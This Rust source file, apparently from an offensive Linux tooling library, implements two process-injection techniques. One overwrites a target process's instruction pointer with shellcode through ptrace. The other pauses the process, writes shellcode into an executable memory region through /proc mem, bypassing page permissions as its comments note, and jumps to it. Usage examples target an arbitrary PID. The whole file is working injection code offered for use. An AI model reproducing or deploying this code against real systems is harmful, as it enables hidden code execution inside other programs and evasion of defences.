//! Techniques that inject a payload into an existing process.

use nix::sys::signal::kill;
use nix::sys::signal::Signal::{SIGCONT, SIGSTOP};

use crate::error::{Error, Result};
use crate::payload::{Inject, Payload, PayloadType};
use crate::primitives::procfs::{find_mem_region, mem_exec, mem_write};
use crate::primitives::ptrace::ptace_write_rip;

/// Uses ptrace to inject shellcode into a target process by overwriting its RIP register.
/// Only works with shellcode payloads.
///
/// # Arguments
/// * `payload` - A `Payload<Inject>` containing shellcode and target process ID
///
/// # Errors
/// Returns an error if:
/// - The payload type is `Executable` (only shellcode is supported)
/// - Process manipulation fails
///
/// # Examples
/// ```no_run
/// use linc::payload::{Inject, Payload};
/// use linc::techniques::inject;
///
/// // Inject shellcode into process with PID 1234
/// let payload = Payload::<Inject>::from_file("shellcode.bin", 1234).unwrap();
///
/// inject::ptrace_overwrite_rip(payload).unwrap();
/// ```
pub fn ptrace_overwrite_rip(payload: Payload<Inject>) -> Result<()> {
    match payload.payload_type() {
        PayloadType::Executable => {
            return Err(Error::NotImplemented(
                "hollow can not take executables".to_string(),
            ));
        }
        PayloadType::Shellcode => {
            ptace_write_rip(payload.pid(), payload.bytes(), false)?;
        }
    }
    Ok(())
}

/// Uses procfs to inject shellcode into a target process by overwriting
/// an executable memory section and then point the RIP register to it.
/// Only works with shellcode payloads.
///
/// # Arguments
/// * `payload` - A `Payload<Inject>` containing shellcode and target process ID
///
/// # Errors
/// Returns an error if:
/// - The payload type is `Executable` (only shellcode is supported)
/// - Process manipulation fails
/// - Memory region lookup fails
/// - Memory writing fails
/// - Process signaling fails
///
/// # Examples
/// ```no_run
/// use linc::payload::{Inject, Payload};
/// use linc::techniques::inject;
///
/// // Inject shellcode into process with PID 1234
/// let payload = Payload::<Inject>::from_file("shellcode.bin", 1234).unwrap();
///
/// inject::procfs_overwrite_rip(payload).unwrap();
/// ```
pub fn procfs_overwrite_rip(payload: Payload<Inject>) -> Result<()> {
    match payload.payload_type() {
        PayloadType::Executable => {
            return Err(Error::NotImplemented(
                "hollow can not take executables".to_string(),
            ));
        }
        PayloadType::Shellcode => {
            let pid = payload.pid();

            // Stop the target process
            kill(pid, SIGSTOP)?;

            // Find an executable memory region
            // ptrace and procfs mem can bypass memory permission
            // and write to non-writable memory
            let addr = find_mem_region(pid, true, "r-x")?[0];

            // Write payload to executable memory
            mem_write(pid, addr, payload.bytes())?;

            // Jump to payload
            mem_exec(pid, addr)?;

            // Continue the target process
            kill(pid, SIGCONT)?;
        }
    }

    Ok(())
}
